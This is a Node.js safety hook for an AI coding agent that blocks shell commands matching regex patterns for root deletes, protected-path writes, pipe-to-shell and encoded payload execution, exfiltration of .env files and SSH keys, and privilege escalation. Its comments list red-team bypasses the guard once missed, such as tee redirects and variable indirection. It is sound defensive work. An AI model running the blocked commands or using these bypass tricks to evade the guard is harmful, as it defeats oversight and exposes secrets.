#!/usr/bin/env node
/**
 * engine/scripts/hooks/bash-safety-guard.cjs — Bash 子进程安全门禁 (P0)
 *
 * PreToolUse(Bash) Hook: 扫描 Bash 命令中的危险模式，拦截:
 *   1. 脚本子进程绕道写入受保护路径 (matlab/golden/fixed_point)
 *   2. 数据泄露 (curl/wget 上传 .env/SSH/credentials)
 *   3. 脚本子进程读取敏感文件 (python open .env)
 *   4. Windows 级联删除/提权 (complement to deny rules)
 *
 * 退出码:
 *   0 — 安全，放行
 *   2 — 危险，拦截 (exit 2 = Hook 系统硬拦截)
 */

'use strict';

// ── 危险模式定义 ───────────────────────────────────────────────────────────

const DANGEROUS_PATTERNS = [
  {
    category: 'catastrophic-delete',
    severity: 'CRITICAL',
    patterns: [
      /\brm\s+-(?:[a-z]*r[a-z]*f|[a-z]*f[a-z]*r)[a-z]*\s+(?:--\s+)?(?:["']?\/["']?(?:\s|$)|["']?\/\*|~(?:\/|\s|$)|["']?\$(?:\{HOME\}|HOME)(?:\/|\s|["']?$))/i,
      /\bRemove-Item\b(?=[^\r\n]*-(?:Recurse|r)\b)(?=[^\r\n]*-(?:Force|fo)\b)[^\r\n]*(?:["']?[A-Za-z]:\\["']?(?:\s|$)|\$HOME\b|\$env:(?:USERPROFILE|SystemRoot)\b)/i,
    ],
    message: 'Catastrophic recursive delete targets a filesystem root or home directory',
  },
  // ===== 1. 脚本子进程绕道写入受保护路径 =====
  {
    category: 'golden-model-bypass',
    severity: 'CRITICAL',
    patterns: [
      // python: open('matlab/...').write(...)
      /python.*open\([^)]*matlab[^)]*\)\s*\.\s*write/i,
      /python.*open\([^)]*golden[^)]*\)\s*\.\s*write/i,
      /python.*open\([^)]*fixed_point[^)]*\)\s*\.\s*write/i,
      // node: fs.writeFileSync('matlab/...', ...)
      /node.*(?:writeFileSync|writeFile)\([^)]*matlab/i,
      /node.*(?:writeFileSync|writeFile)\([^)]*golden/i,
      /node.*(?:writeFileSync|writeFile)\([^)]*fixed_point/i,
      // echo/cat > matlab/... (shell redirect)
      /[>&]{2,}\s*.*matlab\/.*\.m/i,
      /[>&]{2,}\s*.*golden.*\.(m|py|sh)/i,
      // sed -i on protected paths
      /sed\s+-i.*matlab\//i,
      /sed\s+-i.*golden/i,
      /sed\s+-i.*fixed_point/i,
      // Python shutil copy to matlab/
      /shutil\.copy.*matlab/i,
      /shutil\.copy.*golden/i,
      // PowerShell 写入 cmdlet —— 本 guard 注册在 "Bash|PowerShell", 但上面这批
      // 模式全是 POSIX/脚本语言写法。缺了这一段, 在以 PowerShell 为主 shell 的
      // 机器上, `Set-Content matlab/gm.m` 一类命令直接放行, 等于黄金模型保护
      // 在 Bash 侧硬、PowerShell 侧空。source-write-bypass 那组虽然含
      // Set-Content/Out-File, 但要求路径里有 src|rtl|tb|tests 目录段,
      // matlab/ 与 golden*/ 都不在其中, 覆盖不到。
      /(?:Set-Content|Add-Content|Out-File|New-Item|Copy-Item|Move-Item)[\s\S]*matlab[\\/][^"'\s]*\.(?:m|py|sh|mat)\b/i,
      /(?:Set-Content|Add-Content|Out-File|New-Item|Copy-Item|Move-Item)[\s\S]*golden[^"'\s]*[\\/][^"'\s]*\.(?:m|py|sh|mat)\b/i,
      /(?:Set-Content|Add-Content|Out-File|New-Item|Copy-Item|Move-Item)[\s\S]*fixed_point[^"'\s]*\.(?:m|py|sh|mat)\b/i,
      // 管道形式: "content" | Out-File matlab/gm.m
      /\|\s*(?:Out-File|Set-Content|Add-Content)[\s\S]*(?:matlab|golden|fixed_point)/i,
    ],
    message: '绕过黄金模型保护: 脚本子进程写入受保护路径',
  },

  // ===== 1b. 脚本子进程绕过 Edit/Write 门禁写源码 =====
  {
    category: 'source-write-bypass',
    severity: 'CRITICAL',
    patterns: [
      /python[\s\S]*open\([^)]*(?:src|rtl|tb|tests?)[\\/][^)]*\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)[^)]*["'](?:w|a|x|wb|ab|xb)\b/i,
      /python[\s\S]*Path\([^)]*(?:src|rtl|tb|tests?)[\\/][^)]*\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)[^)]*\)[\s\S]*\.write_(?:text|bytes)\b/i,
      /node[\s\S]*(?:writeFileSync|writeFile)\([^)]*(?:src|rtl|tb|tests?)[\\/][^)]*\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)/i,
      /(?:Set-Content|Add-Content|Out-File)[\s\S]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
      />>?\s*["']?[^"'\s]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
      // tee 是重定向的等价物 (2026-07-30 red-team 实测绕过): `echo x | tee src/a.py`
      // 既不是 > 也不是 Set-Content, 上面几条全部看不到它。
      /\btee\b(?:\s+-\w+)*\s+["']?[^"'\s]*(?:src|rtl|tb|tests?)[\\/][^"'\s]+\.(?:py|sv|v|vh|svh|c|cc|cpp|h|hpp|js|cjs|mjs|ts|tsx|jsx)\b/i,
    ],
    message: 'Bash 写源码绕过: 请使用 Edit/Write 工具，让写入门禁检查源码变更',
  },

  // ===== 1c. 编码载荷执行 / 远程代码执行 =====
  // 2026-07-30 red-team 变体扫描实测绕过 (四条全部为 allow):
  //   echo <base64> | base64 -d | sh        —— 载荷编码后所有明文模式全部失效
  //   iex (New-Object Net.WebClient).DownloadString(...)  —— PowerShell 侧无任何 RCE 模式
  //   curl ... | sh                          —— 经典 pipe-to-shell
  // 编码/远程取指的共同点是: 真正要执行的东西不在命令文本里, 明文模式天然看不到。
  // 因此拦的是**取指并执行**这个动作本身, 不是载荷内容。
  {
    category: 'encoded-payload-execution',
    severity: 'CRITICAL',
    patterns: [
      // 解码后直接送进 shell / 解释器
      /\b(?:base64|base32)\b[^|\r\n]*(?:-d|--decode)[^|\r\n]*\|\s*(?:sh|bash|zsh|dash|python\d?|node|perl|ruby)\b/i,
      /\b(?:xxd\s+-r|od\s+-|certutil\s+(?:-decode|\/decode))\b[^|\r\n]*\|\s*(?:sh|bash|zsh|python\d?|node)\b/i,
      // PowerShell 的编码命令入口
      /\bpowershell(?:\.exe)?\b[^\r\n]*-(?:e|ec|enc|encoded|encodedcommand)\b/i,
      /\[(?:System\.)?Convert\]::FromBase64String[\s\S]*\|\s*(?:iex|Invoke-Expression)\b/i,
      // 管道进 shell 的 here-string / 变量求值
      /\becho\s+\$\{?[A-Za-z_][A-Za-z0-9_]*\}?\s*\|\s*(?:sh|bash|zsh)\b/i,
    ],
    message: '编码载荷执行: 命令把解码/编码后的内容直接送进 shell, 真实载荷不可审计',
  },

  {
    category: 'remote-code-execution',
    severity: 'CRITICAL',
    patterns: [
      // curl/wget 取脚本直接执行 (含 process substitution 形式)
      /\b(?:curl|wget|Invoke-WebRequest|iwr)\b[^|\r\n]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|python\d?|node|perl|ruby)\b/i,
      /\b(?:sh|bash|zsh)\s+(?:-\w+\s+)*<\(\s*(?:curl|wget)\b/i,
      // PowerShell 下载后求值
      /\b(?:iex|Invoke-Expression)\b[\s\S]*(?:DownloadString|DownloadFile|Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b/i,
      /\b(?:Invoke-WebRequest|iwr|Invoke-RestMethod|irm)\b[^\r\n]*\|\s*(?:iex|Invoke-Expression)\b/i,
      /\bNew-Object\s+Net\.WebClient[\s\S]*DownloadString/i,
    ],
    message: '远程代码执行: 命令从网络取指后直接执行, 执行内容不在审计范围内',
  },

  // ===== 2. 数据泄露 =====
  {
    category: 'no-bit-cfgmem',
    severity: 'CRITICAL',
    patterns: [
      /\bwrite_bitstream\b/i,
      /\bwrite_cfgmem\b/i,
      /\bbootgen\b/i,
      /\bprogram_flash\b/i,
      /\bopen_hw(?:_manager)?\b/i,
      /(?:>|>>|Out-File|Set-Content|Add-Content|New-Item|touch|copy|cp|mv)\b[\s\S]*\.(?:bit|mcs|ltx)\b/i,
      /(?:>|>>|Out-File|Set-Content|Add-Content|New-Item|touch|copy|cp|mv)\b[\s\S]*\.(?:bin)\b[\s\S]*(?:bitstream|cfgmem|boot|flash)/i,
    ],
    message: 'No-bit/cfgmem gate: bitstream, cfgmem, hardware-programming, and debug-probe artifacts are forbidden in agent project work.',
  },

  {
    category: 'data-exfiltration',
    severity: 'CRITICAL',
    patterns: [
      // curl uploading file contents
      /curl.*--data(?:-binary)?\s+@.*\.env/i,
      /curl.*--data(?:-binary)?\s+@.*id_rsa/i,
      /curl.*--data(?:-binary)?\s+@.*credential/i,
      /curl.*--data(?:-binary)?\s+@.*\.aws/i,
      /curl.*--data(?:-binary)?\s+@.*\.ssh/i,
      /curl.*--data(?:-binary)?\s+@.*token/i,
      /curl.*--data(?:-binary)?\s+@.*secret/i,
      // curl piping file contents
      /curl\s+.*--data\s*@?<\(.*(?:env|rsa|credential|secret|token)\)/i,
      /curl\s+-X\s*POST.*--data.*@(?:\.env|id_rsa|credential)/i,
      // wget with post-file
      /wget.*--post-file.*\.env/i,
      /wget.*--post-file.*id_rsa/i,
      /wget.*--post-file.*credential/i,
      // Exfiltration via DNS/exfiltration tools
      /\|\s*curl\s+.*-d\s+@-/i,
      /\|\s*nc\s+.*\d{4,5}\s*/i,
      // 变量间接引用 (2026-07-30 red-team 实测绕过): `F=.env; curl --data-binary @$F host`
      // 明文路径被藏进变量, 上面按文件名写的模式全部失效。判据改为
      // "上传变量内容" + "同一条命令里出现敏感文件名" 的组合。
      /(?:curl|wget)\b[^\r\n]*(?:--data(?:-binary|-raw)?|--post-file|-d)\s+@?\$\{?[A-Za-z_][A-Za-z0-9_]*\}?[\s\S]*(?:\.env|id_rsa|id_ed25519|credential|\.aws|\.ssh|token|secret)/i,
      /(?:\.env|id_rsa|id_ed25519|credential|\.aws|\.ssh|token|secret)[\s\S]*(?:curl|wget)\b[^\r\n]*(?:--data(?:-binary|-raw)?|--post-file|-d)\s+@?\$\{?[A-Za-z_][A-Za-z0-9_]*\}?/i,
    ],
    message: '数据泄露检测: 尝试通过管道/文件上传敏感数据',
  },

  // ===== 3. 脚本子进程读取敏感文件 =====
  {
    category: 'sensitive-read-bypass',
    severity: 'HIGH',
    patterns: [
      // python: open('.env').read()
      /python.*open\([^)]*\.env[^)]*\)\s*\.\s*read/i,
      /python.*open\([^)]*id_rsa[^)]*\)\s*\.\s*read/i,
      /python.*open\([^)]*credential[^)]*\)\s*\.\s*read/i,
      /python.*open\([^)]*\.aws[^)]*\)\s*\.\s*read/i,
      // node: readFileSync('.env')
      /node.*readFileSync\([^)]*\.env/i,
      /node.*readFileSync\([^)]*id_rsa/i,
      /node.*readFileSync\([^)]*credential/i,
    ],
    message: '敏感文件读取: 脚本子进程绕过 Read deny 规则',
  },

  // ===== 4. 提权/系统篡改 =====
  {
    category: 'privilege-escalation',
    severity: 'CRITICAL',
    patterns: [
      // sudo dangerous
      /\bsudo\s+(?:rm|del|mv|chmod\s+777|chown)\s/i,
      // chmod -R 777 on sensitive dirs
      /chmod\s+-R\s+777\s+\/{0,1}(?:etc|usr|bin|boot|dev)/i,
      // Windows: takeown / icacls full control on system dirs
      /takeown\s+\/f\s+(?:C:)?\\\\(?:Windows|Program\s*Files|System32)/i,
      /icacls\s+.*(?:C:)?\\\\(?:Windows|System32)\s*\/grant.*:F/i,
      // Windows: disable security
      /netsh\s+advfirewall\s+set\s+allprofiles\s+state\s+off/i,
      /reg\s+add.*CurrentVersion\\Run/i,
      // vssadmin delete (shadow copies)
      /vssadmin\s+delete\s+shadows/i,
      // bcdedit (boot config)
      /bcdedit\s+\/set\s+.*recoveryenabled/i,
    ],
    message: '提权/系统篡改检测: 高危系统操作',
  },

  // ===== 5. 系统安装规则 (07-system.md) =====
  {
    category: 'system-install',
    severity: 'HIGH',
    patterns: [
      // C 盘安装检测
      /^(?:pip|npm|apt|choco|scoop)\s+install\b/i,
      /^cargo\s+install\b/i,
      /^gem\s+install\b/i,
      /^brew\s+install\b/i,
    ],
    message: '系统安装检测: 确保安装到 D 盘而非 C 盘',
  },

  // ===== 6. SQL 破坏操作 (04-security.md) =====
  {
    category: 'sql-destructive',
    severity: 'CRITICAL',
    patterns: [
      /\bDROP\s+TABLE\b/i,
      /\bTRUNCATE\s+TABLE\b/i,
      /\bDELETE\s+FROM\b(?!.*\bWHERE\b)/i,
      /\bDROP\s+DATABASE\b/i,
      /\bALTER\s+.*\bDROP\b/i,
    ],
    message: 'SQL 破坏操作检测: DROP TABLE/TRUNCATE 被禁止',
  },
];

// ── 辅助函数 ─────────────────────────────────────────────────────────────────

function readStdin() {
  return new Promise(resolve => {
    let raw = '';
    process.stdin.setEncoding('utf8');
    process.stdin.on('data', chunk => { raw += chunk; });
    process.stdin.on('end', () => resolve(raw));
  });
}

/**
 * 输出阻断信息到 stderr（会被反馈给 Claude）。
 */
function blockDiagnostics(info, command) {
  return [
    '',
    '╔══════════════════════════════════════════════════════════════╗',
    '║      🛑  BASH SAFETY GUARD — 命令被阻断                    ║',
    '╠══════════════════════════════════════════════════════════════╣',
    `║  风险等级: ${info.severity.padEnd(40)}║`,
    `║  类别:     ${info.category.padEnd(40)}║`,
    `║  原因:     ${info.message.padEnd(40)}║`,
    '║                                                              ║',
    '║  此命令被 Bash 安全门禁止执行。                                 ║',
    '║  如需绕过: 在 settings.local.json 中添加例外规则。             ║',
    '╚══════════════════════════════════════════════════════════════╝',
    '',
    `[BashSafetyGuard] BLOCKED: ${info.message}`,
    `[BashSafetyGuard] Command (truncated): ${command.slice(0, 200)}`,
  ];
}

/**
 * 扫描命令是否匹配任何危险模式。
 * @param {string} command
 * @returns {{ matched: boolean, info: object|null }}
 */
function scanCommand(command) {
  if (!command || command.length === 0) {
    return { matched: false, info: null };
  }

  for (const group of DANGEROUS_PATTERNS) {
    for (const regex of group.patterns) {
      if (regex.test(command)) {
        return { matched: true, info: group };
      }
    }
  }

  return { matched: false, info: null };
}

function commandFrom(payload) {
  return String(
    payload?.tool_input?.command
    || payload?.tool?.input?.command
    || payload?.input?.command
    || payload?.command
    || ''
  ).trim();
}

function evaluate(payload, _runtime = {}) {
  const command = commandFrom(payload);
  if (!command) {
    return { source: 'bash-safety-guard', decision: 'allow', diagnostics: [] };
  }

  const { matched, info } = scanCommand(command);
  if (!matched) {
    return { source: 'bash-safety-guard', decision: 'allow', diagnostics: [] };
  }

  return {
    source: 'bash-safety-guard',
    decision: 'block',
    diagnostics: blockDiagnostics(info, command),
    category: info.category,
    severity: info.severity,
  };
}

// ── 主逻辑 ───────────────────────────────────────────────────────────────────

async function main() {
  try {
    const raw = (await readStdin()).replace(/^\uFEFF/, '');
    if (!raw) process.exit(0);

    const payload = JSON.parse(raw);

    const result = evaluate(payload);
    for (const line of result.diagnostics) process.stderr.write(`${line}\n`);
    if (result.decision === 'block') process.exit(2); // 硬拦截
  } catch (e) {
    // 解析失败时不阻断，静默放行
    console.error(`[BashSafetyGuard] 解析错误(放行): ${e.message}`);
  }

  process.exit(0);
}

if (require.main === module) main();

module.exports = {
  commandFrom,
  evaluate,
  scanCommand,
};
